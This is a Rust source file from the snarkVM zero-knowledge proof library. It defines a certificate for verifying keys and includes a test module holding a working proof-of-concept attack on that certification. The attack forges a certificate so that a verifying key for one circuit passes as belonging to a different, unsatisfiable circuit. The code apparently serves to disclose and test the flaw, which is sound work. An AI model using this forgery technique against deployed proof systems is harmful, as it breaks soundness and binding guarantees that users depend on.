// Copyright (C) 2019-2023 Aleo Systems Inc.
// This file is part of the snarkVM library.

// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at:
// http://www.apache.org/licenses/LICENSE-2.0

// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

use super::*;

mod bytes;
mod parse;
mod serialize;

#[derive(Clone, PartialEq, Eq)]
pub struct Certificate<N: Network> {
    /// The certificate.
    pub certificate: varuna::Certificate<N::PairingCurve>,
}

impl<N: Network> Certificate<N> {
    /// Initializes a new certificate.
    pub(super) const fn new(certificate: varuna::Certificate<N::PairingCurve>) -> Self {
        Self { certificate }
    }

    /// Returns the certificate from the proving and verifying key.
    pub fn certify(
        function_name: &str,
        proving_key: &ProvingKey<N>,
        verifying_key: &VerifyingKey<N>,
    ) -> Result<Certificate<N>> {
        #[cfg(feature = "aleo-cli")]
        let timer = std::time::Instant::now();

        // Retrieve the proving parameters.
        let universal_prover = N::varuna_universal_prover();
        let fiat_shamir = N::varuna_fs_parameters();

        // Compute the certificate.
        let certificate = Varuna::<N>::prove_vk(universal_prover, fiat_shamir, verifying_key, proving_key)?;

        #[cfg(feature = "aleo-cli")]
        println!("{}", format!(" • Certified '{function_name}': {} ms", timer.elapsed().as_millis()).dimmed());

        Ok(Self::new(certificate))
    }

    /// Returns the certificate from the proving and verifying key.
    pub fn verify(
        &self,
        function_name: &str,
        assignment: &circuit::Assignment<N::Field>,
        verifying_key: &VerifyingKey<N>,
    ) -> bool {
        #[cfg(feature = "aleo-cli")]
        let timer = std::time::Instant::now();

        // Retrieve the verification parameters.
        let universal_verifier = N::varuna_universal_verifier();
        let fiat_shamir = N::varuna_fs_parameters();

        // Verify the certificate.
        match Varuna::<N>::verify_vk(universal_verifier, fiat_shamir, assignment, verifying_key, self) {
            Ok(is_valid) => {
                #[cfg(feature = "aleo-cli")]
                {
                    let elapsed = timer.elapsed().as_millis();
                    println!("{}", format!(" • Verified certificate for '{function_name}': {elapsed} ms").dimmed());
                }

                is_valid
            }
            Err(error) => {
                println!("error: {}", error);
                #[cfg(feature = "aleo-cli")]
                println!("{}", format!(" • Certificate verification failed: {error}").dimmed());
                false
            }
        }
    }
}

impl<N: Network> Deref for Certificate<N> {
    type Target = varuna::Certificate<N::PairingCurve>;

    fn deref(&self) -> &Self::Target {
        &self.certificate
    }
}

mod attack {

    use super::*;

    use circuit::{
        environment::{Assignment, Circuit, Environment, Inject, Mode, One},
        types::Field,
    };
    use console::{self, network::Testnet3, prelude::One as _};

    use crate::{Certificate, TestRng, Varuna};
    use crate::{ProvingKey, UniversalSRS, VerifyingKey};

    type CurrentNetwork = Testnet3;

    // This parameterized circuit was chosen as a minimal example to illustrate the attack:
    //
    // It has two witness values (a, ai) and enforces:
    //
    // 1. a * ai = 1      : "a" is non-zero
    // 2. a * 1  = c1 * a : "a" is zero or the constant "c1" is 1
    // 3. a * c2 = c2 * a : always true.
    //
    // The point of this simple circuit is:
    //
    // 1. It is easily satisifiable, when c1 = 1.
    // 2. When c1 \neq 1, it is unsatisifiable.
    //
    // In this attack we will:
    //
    // 1. Create a certification that a verification "vk" corresponds to a circuit with c1 = 2 (not satisifiable)
    // 2. Create an accepting proof for the "certified" vk.
    //
    // By exploiting a flaw in the certification process.
    // Allowing us to "switch" a certification of the circuit with c1 = 1 into a certification with c1 = 2.
    //
    // For more complex circuits, this exploit could be used to e.g. change the basepoint constants of the elliptic curve:
    // breaking binding of e.g. the Pedersen hash.
    //
    // c2 is introduced because the attack requires at least 2 non-zero constants somewhere in the circuit.
    pub fn circuit_family<E: Environment>(c1: E::BaseField, c2: E::BaseField) {
        let one = console::types::Field::<E::Network>::one();

        // witness and its inverse (to ensure non-zero)
        let a: Field<E> = Field::new(Mode::Private, one);
        let ai: Field<E> = Field::new(Mode::Private, one);

        // constant
        let c1w = Field::new(Mode::Constant, console::types::Field::new(c1));
        let c2w = Field::new(Mode::Constant, console::types::Field::new(c2));

        // a * (ai) = 1
        E::enforce(|| {
            let wa: Field<E> = a.clone();
            let wai: Field<E> = ai;
            let one: Field<E> = Field::one();
            (wa, wai, one)
        });

        // a * 1 = c1 * a
        E::enforce(|| {
            let wa: Field<E> = a.clone();
            let wt: Field<E> = Field::one();
            (wa, wt, c1w * a.clone())
        });

        // a * c2 = c2 * a
        E::enforce(|| {
            let wa: Field<E> = a.clone();
            let wt: Field<E> = Field::one(); // linear combination c * a
            (wa, c2w.clone(), c2w * a.clone())
        });
    }

    /// Returns a sample assignment for the example circuit.
    pub(crate) fn sample_assignment(
        c1: <Circuit as Environment>::BaseField,
        c2: <Circuit as Environment>::BaseField,
    ) -> Assignment<<Circuit as Environment>::BaseField> {
        circuit_family::<Circuit>(c1, c2);
        let assignment = Circuit::eject_assignment_and_reset();
        assert_eq!(0, Circuit::num_constants());
        assert_eq!(1, Circuit::num_public());
        assert_eq!(0, Circuit::num_private());
        assert_eq!(0, Circuit::num_constraints());
        assignment
    }

    pub fn attack_certification() {
        type CurrentNetwork = Testnet3;

        // public input (not used)
        let inst = [<Circuit as Environment>::BaseField::one()];

        // generate verification key for a malicious circuit (one with c1 = 1)
        let c1 = <Circuit as Environment>::BaseField::one();
        let assign_bad = sample_assignment(c1, c1);
        let srs: UniversalSRS<CurrentNetwork> = UniversalSRS::load().unwrap();
        let (pk, vk) = srs.to_circuit_key("test", &assign_bad).unwrap();

        // certify the malicious circuit
        let cert: Certificate<CurrentNetwork> = Certificate::certify("test", &pk, &vk).unwrap();
        println!("system: {:#?}", assign_bad);

        // we can prove the malicious circuit
        let pf = pk.prove("test", &assign_bad, &mut TestRng::default()).unwrap();
        let ok = vk.verify("test", &inst, &pf);
        assert!(ok);

        // obtain challenge point for malicious circuit
        let universal_verifier = CurrentNetwork::varuna_universal_verifier();
        let fiat_shamir = CurrentNetwork::varuna_fs_parameters();
        let (x1, lin1, e1, _) = Varuna::<CurrentNetwork>::attack_challenges(&fiat_shamir, &vk, &assign_bad).unwrap();

        // Retrieve the proving parameters.
        let universal_prover = CurrentNetwork::varuna_universal_prover();

        // deduce linear coefficient in c2
        let c2 = c1 + <Circuit as Environment>::BaseField::one();
        let assign_c1_c2 = sample_assignment(c1, c2);
        let fiat_shamir = CurrentNetwork::varuna_fs_parameters();
        let (x2, lin2, e2, _) = Varuna::<CurrentNetwork>::attack_challenges(&fiat_shamir, &vk, &assign_c1_c2).unwrap();
        let delta2 = e2 - e1;

        assert_eq!(x2, x1);
        assert_eq!(lin2, lin1);

        // deduce linear coefficient in c1
        let assign_c2_c1 = sample_assignment(c2, c1);
        let fiat_shamir = CurrentNetwork::varuna_fs_parameters();
        let (x3, lin3, e3, _) = Varuna::<CurrentNetwork>::attack_challenges(&fiat_shamir, &vk, &assign_c2_c1).unwrap();
        let delta1 = e3 - e1;

        assert_eq!(x3, x1);
        assert_eq!(lin3, lin1);

        // sanity check: system is now linear
        let c3 = c2 + <Circuit as Environment>::BaseField::one();
        let assign_test = sample_assignment(c3, c3);
        let fiat_shamir = CurrentNetwork::varuna_fs_parameters();
        let (x3, lin3, e3, _) = Varuna::<CurrentNetwork>::attack_challenges(&fiat_shamir, &vk, &assign_test).unwrap();
        // test
        let t: <Circuit as Environment>::BaseField = c2 * delta1 + c2 * delta2;
        assert_eq!(e1 + t, e3);

        // solve for a "good circuit": an unsatisfiable circuit in our case
        //
        // e1 = 1 * delta1 + 1 * delta2 + cnst
        //
        // e1 = v1 * delta1 + v2 * delta2 + cnst
        //
        // 0 = (v1 - 1) * delta1 + (v2 - 1) * delta2
        //
        // d2 * delta2 = - d1 * delta1
        //
        // v2 = d2 + 1
        // d1 = v2 - 1
        let v1 = c2;
        let d1 = v1 - <Circuit as Environment>::BaseField::one();
        let d2 = (-delta1 * d1) / delta2;
        let v2 = d2 + <Circuit as Environment>::BaseField::one();

        let assign_attack = sample_assignment(v1, v2);
        let fiat_shamir = CurrentNetwork::varuna_fs_parameters();
        let (x_atck, lin_atck, e_atck, id) =
            Varuna::<CurrentNetwork>::attack_challenges(&fiat_shamir, &vk, &assign_attack).unwrap();

        assert_eq!(x_atck, x1);
        assert_eq!(lin_atck, lin1);
        assert_eq!(e_atck, e1);

        println!("the \"honest\" circuit has c1 = {:?}, c2 = {:?}", v1, v2);
        println!("lets generate a \"certificate\" that the vk is for this honest circuit:");

        // we need to change the circuit id in the vk (controlled by the adversary)
        let verk: &varuna::CircuitVerifyingKey<_> = &*vk.verifying_key;
        let mut verk: varuna::CircuitVerifyingKey<_> = verk.clone();
        verk.id = id;
        let vk = VerifyingKey { verifying_key: Arc::new(verk.clone()) };

        let pref: &varuna::CircuitProvingKey<_, _> = &*pk.proving_key;
        let mut pref: varuna::CircuitProvingKey<_, _> = pref.clone();
        pref.circuit_verifying_key = verk;
        let pk = ProvingKey { proving_key: Arc::new(pref) };

        // this is my verification key, the corresponding pk can be used to prove the circuit with c1 = 1, c2 = 1

        // "verify" that vk corresponds to an unsatisfiable circuit with c1 \neq c2 \neq 1
        {
            assert_ne!(v1, <Circuit as Environment>::BaseField::one(), "bad circuit detected");
            assert_ne!(v2, <Circuit as Environment>::BaseField::one(), "bad circuit detected");
            let honest_circuit = sample_assignment(v1, v2);
            let ok = cert.verify("test", &honest_circuit, &vk);
            assert!(ok);
            println!("certification of the maliciously generated vk against the \"good\" circuit passed");
        }

        // just to emphasis we can still make a valid proof for the vk/pk
        let mut rng = TestRng::default();
        let pf = pk.prove("test", &assign_bad, &mut rng).unwrap();
        let ok = vk.verify("test", &inst, &pf);
        assert!(ok);
    }

    #[test]
    fn run_attack() {
        attack_certification()
    }
}
